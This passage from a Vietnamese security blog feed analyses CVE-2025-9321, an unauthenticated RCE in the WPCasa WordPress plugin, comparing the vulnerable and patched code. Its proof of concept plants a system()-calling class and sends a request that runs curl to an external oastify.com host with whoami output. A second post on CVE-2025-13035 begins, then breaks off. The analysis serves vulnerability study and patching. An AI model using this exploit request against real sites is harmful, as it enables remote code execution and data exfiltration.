href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WPCasa&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v1.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    if ( ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) )&#xA;        $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] = sanitize_text_field( $_GET[&amp;#39;wpsight-api&amp;#39;] );&#xA;&#xA;    if ( ! empty( $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] ) ) {&#xA;        // Buffer, we won&amp;#39;t want any output here&#xA;        ob_start();&#xA;&#xA;        // Get API trigger&#xA;        $api = strtolower( esc_attr( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;&#xA;        // Load class if exists&#xA;        if ( class_exists( $api ) )&#xA;            $api_class = new $api();&#xA;&#xA;        // Trigger actions&#xA;        do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;        // Done, clear buffer and exit&#xA;        ob_end_clean();&#xA;        die(&amp;#39;1&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y l·∫•y tham s·ªë &lt;code&gt;wpsight-api&lt;/code&gt; t·ª´ URL, d√πng n√≥ ƒë·ªÉ t·∫°o class n·∫øu t·ªìn t·∫°i v√† g·ªçi hook &lt;code&gt;do_action&lt;/code&gt; t∆∞∆°ng ·ª©ng, sau ƒë√≥ k·∫øt th√∫c b·∫±ng &lt;code&gt;die(&#39;1&#39;)&lt;/code&gt;. V·∫•n ƒë·ªÅ l√† d·ªØ li·ªáu t·ª´ URL kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t, d·ªÖ b·ªã l·ª£i d·ª•ng ƒë·ªÉ th·ª±c thi m√£ tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v1.4.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    // 1) Preferred getter.&#xA;    $raw = get_query_var( &amp;#39;wpsight-api&amp;#39; );&#xA;&#xA;    // 2) Fallback: directly from $wp-&amp;gt;query_vars.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; isset( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;];&#xA;    }&#xA;&#xA;    // 3) Last resort: direct $_GET.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = sanitize_text_field( wp_unslash( $_GET[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;    }&#xA;&#xA;    // No request found ‚Üí exit early.&#xA;    if ( empty( $raw ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Sanitize to a valid key.&#xA;    $api = sanitize_key( $raw );&#xA;&#xA;    if ( empty( $api ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    /**&#xA;        * Build allow-list of allowed API endpoints.&#xA;        *&#xA;        * IMPORTANT: Replace or extend this list in your theme or plugin&#xA;        * using the &amp;#39;wpsight_api_allowed_endpoints&amp;#39; filter.&#xA;        *&#xA;        * Example:&#xA;        *&#xA;        * add_filter( &amp;#39;wpsight_api_allowed_endpoints&amp;#39;, function( $allowed ) {&#xA;        *     $allowed[&amp;#39;ping&amp;#39;] = array( &amp;#39;class&amp;#39; =&amp;gt; null );&#xA;        *     return $allowed;&#xA;        * } );&#xA;        */&#xA;    $allowed = apply_filters(&#xA;        &amp;#39;wpsight_api_allowed_endpoints&amp;#39;,&#xA;        array()&#xA;    );&#xA;&#xA;    // If API is not allowed, block access.&#xA;    if ( ! isset( $allowed[ $api ] ) ) {&#xA;        wp_die(&#xA;            sprintf(&#xA;            /* translators: %s: API endpoint slug */&#xA;                esc_html__( &amp;#39;Endpoint &amp;#34;%s&amp;#34; not allowed.&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;                $api&#xA;            ),&#xA;            esc_html__( &amp;#39;Forbidden&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;            array( &amp;#39;response&amp;#39; =&amp;gt; 403 )&#xA;        );&#xA;    }&#xA;&#xA;    // Start output buffering.&#xA;    ob_start();&#xA;&#xA;    // Optional: safe class instantiation if explicitly allowed.&#xA;    if ( ! empty( $allowed[ $api ][&amp;#39;class&amp;#39;] ) &amp;amp;&amp;amp; class_exists( $allowed[ $api ][&amp;#39;class&amp;#39;] ) ) {&#xA;        new $allowed[ $api ][&amp;#39;class&amp;#39;]();&#xA;    }&#xA;&#xA;    /**&#xA;        * Trigger API action hook.&#xA;        *&#xA;        * Example usage:&#xA;        * add_action( &amp;#39;wpsight_api_ping&amp;#39;, function() {&#xA;        *     echo &amp;#39;pong&amp;#39;;&#xA;        * } );&#xA;        */&#xA;    do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;    // In development mode, allow buffer output for easier testing.&#xA;    if ( defined( &amp;#39;WP_DEBUG&amp;#39; ) &amp;amp;&amp;amp; WP_DEBUG ) {&#xA;        ob_end_flush();&#xA;    } else {&#xA;        ob_end_clean();&#xA;    }&#xA;&#xA;    // Maintain old behaviour for backward compatibility.&#xA;    die( &amp;#39;1&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#39; alt=&#34;Diff&#34; height=&#34;975&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y d·ªØ li·ªáu theo th·ª© t·ª±: &lt;code&gt;get_query_var&lt;/code&gt; ‚Üí &lt;code&gt;$wp-&amp;gt;query_vars&lt;/code&gt; ‚Üí &lt;code&gt;$_GET&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;sanitize_key&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o d·ªØ li·ªáu h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;C√≥ danh s√°ch cho ph√©p (allow-list) qua filter &lt;code&gt;wpsight_api_allowed_endpoints&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu endpoint kh√¥ng n·∫±m trong danh s√°ch th√¨ ch·∫∑n truy c·∫≠p (403).&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ t·∫°o class n·∫øu ƒë∆∞·ª£c khai b√°o r√µ r√†ng trong danh s√°ch.&lt;/li&gt;&#xA;&lt;li&gt;C√≥ h·ªó tr·ª£ ch·∫ø ƒë·ªô debug ƒë·ªÉ ki·ªÉm th·ª≠ d·ªÖ d√†ng.&lt;/li&gt;&#xA;&lt;li&gt;An to√†n h∆°n, h·∫°n ch·∫ø vi·ªác th·ª±c thi m√£ tr√°i ph√©p.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;parse_request&amp;#39;, array( $this, &amp;#39;api_requests&amp;#39;), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;parse_request&lt;/code&gt;: hook ƒë∆∞·ª£c k√≠ch ho·∫°t r·∫•t s·ªõm, ngay sau khi WordPress ph√¢n t√≠ch URL v√† t·∫°o ƒë·ªëi t∆∞·ª£ng &lt;code&gt;$wp&lt;/code&gt;. ƒê√¢y l√† l√∫c c√°c tham s·ªë query ƒë∆∞·ª£c x·ª≠ l√Ω. =&amp;gt; Ngay khi WordPress ph√¢n t√≠ch request, callback &lt;code&gt;api_requests&lt;/code&gt; c·ªßa s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω c√°c y√™u c·∫ßu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Attacker sends request /?wpsight-api=payload&amp;#34;] --&amp;gt; B[&amp;#34;parse_request hook triggers api_requests()&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Read user input $_GET[&amp;#39;wpsight-api&amp;#39;]&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$api = strtolower(esc_attr(...))&amp;#34;]&#xA;&#xA;D --&amp;gt; E{&amp;#34;class_exists($api)?&amp;#34;}&#xA;E -- Yes --&amp;gt; F[&amp;#34;Instantiate arbitrary class new $api() ‚Üí constructor executes&amp;#34;]&#xA;E -- No --&amp;gt; G[&amp;#34;Skip class creation&amp;#34;]&#xA;&#xA;F --&amp;gt; H[&amp;#34;Trigger dynamic hook do_action(&amp;#39;wpsight_api_&amp;#39; . $api)&amp;#34;]&#xA;G --&amp;gt; H&#xA;&#xA;H --&amp;gt; I{&amp;#34;Hook handler exists?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Callback executed ‚Üí attacker-controlled code&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;No action, but die(&amp;#39;1&amp;#39;) still called&amp;#34;]&#xA;&#xA;J --&amp;gt; L[&amp;#34;RCE achieved&amp;#34;]&#xA;K --&amp;gt; L&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class evil v√† ƒë·∫∑t trong wp-config.php ƒë·ªÉ test:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;command = isset($_REQUEST[&amp;#39;cmd&amp;#39;]) ? $_REQUEST[&amp;#39;cmd&amp;#39;] : $this-&amp;gt;command;&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /?wpsight-api=evil&amp;amp;cmd=curl&amp;#43;http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1138&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªói xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω tham s·ªë &lt;code&gt;wpsight-api&lt;/code&gt; kh√¥ng an to√†n, cho ph√©p g·ªçi class v√† hook t√πy √Ω, d·∫´n ƒë·∫øn RCE. B·∫£n v√° th√™m ki·ªÉm so√°t ƒë·∫ßu v√†o v√† gi·ªõi h·∫°n endpoint ƒë·ªÉ ch·∫∑n khai th√°c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;D·ªØ li·ªáu URL c·∫ßn ƒë∆∞·ª£c gi·ªõi h·∫°n b·∫±ng allow‚Äëlist.&lt;/li&gt;&#xA;&lt;li&gt;Hook v√† class ƒë·ªông ph·∫£i ƒë∆∞·ª£c b·∫£o v·ªá kh·ªèi input ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t ƒë·∫ßu v√†o sai c√≥ th·ªÉ d·∫´n ƒë·∫øn RCE nghi√™m tr·ªçng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin &amp;lt;= 1.4.1 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13035 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/</link>
      <pubDate>Thu, 27 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin Code Snippets cho WordPress t·ªìn t·∫°i l·ªó h·ªïng PHP Code Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, 3.9.1. Nguy√™n nh√¢n l√† do plugin s·ª≠ d·ª•ng &lt;code&gt;extract()&lt;/code&gt; tr√™n shortcode attributes do attacker ki·ªÉm so√°t b√™n trong method &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, c√≥ th·ªÉ ƒë∆∞·ª£c d√πng ƒë·ªÉ ghi ƒë√® bi·∫øn &lt;code&gt;$filepath&lt;/code&gt; v√† sau ƒë√≥ truy·ªÅn v√†o require_once. ƒêi·ªÅu n√†y cho ph√©p attacker ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn Contributor tr·ªü l√™n, th·ª±c thi t√πy √Ω PHP code tr√™n server th√¥ng qua shortcode &lt;code&gt;[code_snippet]&lt;/code&gt; b·∫±ng c√°ch s·ª≠ d·ª•ng PHP filter chains n·∫øu h·ªç c√≥ th·ªÉ l·ª´a administrator b·∫≠t t√πy ch·ªçn &amp;ldquo;Enable file-based execution&amp;rdquo; v√† t·∫°o √≠t nh·∫•t m·ªôt Content snippet ƒëang ho·∫°t ƒë·ªông.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13035&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13035&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.9.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: 